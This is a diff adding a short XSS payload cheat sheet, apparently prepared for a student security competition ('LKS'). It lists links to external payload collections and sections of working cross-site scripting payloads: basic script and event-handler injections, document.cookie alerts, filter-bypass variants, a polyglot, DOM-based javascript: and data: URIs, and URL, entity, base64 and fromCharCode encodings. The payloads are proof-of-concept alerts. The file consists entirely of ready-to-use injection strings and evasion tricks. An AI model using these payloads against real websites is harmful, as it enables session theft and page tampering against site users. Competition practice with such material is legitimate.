@@ -1,0 +1,86 @@
+ALL PAYLOADS NEEDED FOR LKS
+by Muhammad Fahri
+
+
+https://payloadplayground.com/cheatsheets/xss
+
+https://github.com/yogsec/XSS-Payloads/blob/main/blind_xss_payloads.txt
+
+=======================================
+Percobaan:
+<script>alert("XSS");</script>
+
+<body onload=alert(1)>
+
+<svg onload=alert(1)>
+
+=======================================
+
+Payloads:
+<input value="" onfocus="alert('XSS')" autofocus="">
+
+<img src=x onerror=alert(1)> (ifBlocked)
+
+<script>alert(document.domain)</script>
+
+<script>alert(document.cookie)</script>
+
+<img src=x onerror=alert(1)>
+
+=======================================
+
+Filtered:
+
+<ScRiPt>alert(1)</ScRiPt>
+
+<scr<script>ipt>alert(1)</scr</script>ipt>
+
+<script>alert`1`</script>
+
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
+
+<svg/onload=alert(1)>
+
+'-alert(1)-'
+
+</script><script>alert(1)</script>
+
+<a href="javascript:void(0)" onmouseover=alert(1)>x</a>
+
+
+=======================================
+
+Polyglots:
+
+
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+
+=======================================
+DOM-based:
+
+document.location="javascript:alert(1)"
+
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+<script>alert(1)</script>
+
+javascript:alert(document.domain)
+
+#<img src=x onerror=alert(1)>
+
+#<img src=x onerror=alert(1)>
+
+javascript:alert(document.domain)
+
+=======================================
+Encoding:
+
+%3Cscript%3Ealert(1)%3C/script%3E
+
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+
+<script>eval(atob("YWxlcnQoMSk="))</script>
+
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+
+&#60;script&#62;alert(1)&#60;/script&#62;
